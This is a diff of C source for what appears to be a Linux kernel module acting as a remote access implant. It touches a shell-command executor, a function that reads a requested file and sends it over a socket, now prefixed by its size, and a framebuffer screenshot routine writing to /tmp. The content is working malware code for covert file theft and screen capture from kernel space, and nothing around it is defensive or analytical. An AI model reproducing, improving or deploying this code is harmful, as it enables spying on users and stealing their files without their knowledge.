@@ -34,14 +34,14 @@ int execute_shell_command(char *cmd) {
 /*
     Send the response back to the socket connection.
 */
-int send_message(struct socket *sock, const char *message) {
+int send_message(struct socket *sock, char *message) {
     struct kvec vec;
     struct msghdr msg;
     int ret;
 
     // Configure the message struct
-    vec.iov_base = (void *)message;
-    vec.iov_len = strlen(message) + 1;
+    vec.iov_base = message;
+    vec.iov_len = strlen(message);
     // Set the message memory
     memset(&msg, 0, sizeof(msg));
 
@@ -88,6 +88,7 @@ int read_file(struct socket *sock, char *filename) {
     loff_t pos = 0;
     int ret;
     loff_t file_size;
+    char buff[30];
 	
 	memset(buffer, 0, BUFFER_SIZE);
     // Open the file
@@ -99,6 +100,13 @@ int read_file(struct socket *sock, char *filename) {
     
     // Get the file size
 	file_size = vfs_llseek(file, 0, SEEK_END);
+	
+	memset(buff, 0, 30);
+	
+	sprintf(buff, "%lld", file_size);
+	
+	send_message(sock, buff);
+	msleep(1500);
     
     // Read the file
     while (pos < file_size) {
@@ -111,12 +119,11 @@ int read_file(struct socket *sock, char *filename) {
             filp_close(file, NULL);
             return 0;
         }
+        udelay(1);
     }
     // Close file
     filp_close(file, NULL);
     
-    ret = send_message(sock, "END\n");
-
     return 1;
 }
 
@@ -126,18 +133,18 @@ int read_file(struct socket *sock, char *filename) {
 */
 
 int screenshot_ppm(void) {
-	struct fb_info *info;
-	void *screen_base;
-	void *buf;
-	long screen_size;
+    struct fb_info *info;
+    void *screen_base;
+    void *buf;
+    long screen_size;
     struct file *file;
     struct file *outfile;
     char header[18];
-    loff_t pos;
+    loff_t pos = 0;
     u32 *pixel;
     u8 rgb[3];
-    int x, y;    
-    
+    int x, y;
+
     file = filp_open("/dev/fb0", O_RDONLY, 0);
     if (IS_ERR(file)) {
         printk(KERN_ALERT "filp_open error\n");
@@ -165,17 +172,15 @@ int screenshot_ppm(void) {
     // You can write this data to an image file.
     // The exact procedure depends on the image format you want to use.
     // For simplicity, let's assume you're writing a raw PPM file.
-    
 
-    outfile = filp_open("/tmp/screenshot.ppm", O_WRONLY | O_CREAT, 0666);
+    outfile = filp_open("/tmp/screenshot.ppm", O_WRONLY | O_CREAT | O_TRUNC, 0666);
     if (IS_ERR(outfile)) {
         printk(KERN_ALERT "filp_open error\n");
         kfree(buf);
         filp_close(file, 0);
         return -1;
     }
-	
-	pos = 0;
+
     sprintf(header, "P6\n%d %d\n255\n", info->var.xres, info->var.yres);
     if (kernel_write(outfile, header, strlen(header), &pos) < 0) {
         printk(KERN_ERR "kernel_write error\n");
@@ -184,24 +189,14 @@ int screenshot_ppm(void) {
         filp_close(file, 0);
         return -1;
     }
-    pos = strlen(header);
+
     pixel = (u32 *)buf;
     for (y = 0; y < info->var.yres; y++) {
         for (x = 0; x < info->var.xres; x++) {
             u32 color = *pixel++;
-            u8 r, g, b;
-            if (info->var.red.length == 8)
-                r = (color >> info->var.red.offset) & 0xFF;
-            else
-                r = (color >> info->var.red.offset) & ((1 << info->var.red.length) - 1);
-            if (info->var.green.length == 8)
-                g = (color >> info->var.green.offset) & 0xFF;
-            else
-                g = (color >> info->var.green.offset) & ((1 << info->var.green.length) - 1);
-            if (info->var.blue.length == 8)
-                b = (color >> info->var.blue.offset) & 0xFF;
-            else
-                b = (color >> info->var.blue.offset) & ((1 << info->var.blue.length) - 1);
+            u8 r = (color >> info->var.red.offset) & ((1 << info->var.red.length) - 1);
+            u8 g = (color >> info->var.green.offset) & ((1 << info->var.green.length) - 1);
+            u8 b = (color >> info->var.blue.offset) & ((1 << info->var.blue.length) - 1);
             rgb[0] = r; rgb[1] = g; rgb[2] = b;
             if (kernel_write(outfile, rgb, 3, &pos) < 0) {
                 printk(KERN_ERR "kernel_write error\n");
@@ -213,9 +208,9 @@ int screenshot_ppm(void) {
         }
     }
 
-    filp_close(outfile, 0);
+    filp_close(outfile, NULL);
     kfree(buf);
-    filp_close(file, 0);
+    filp_close(file, NULL);
 
     return 0;
 }
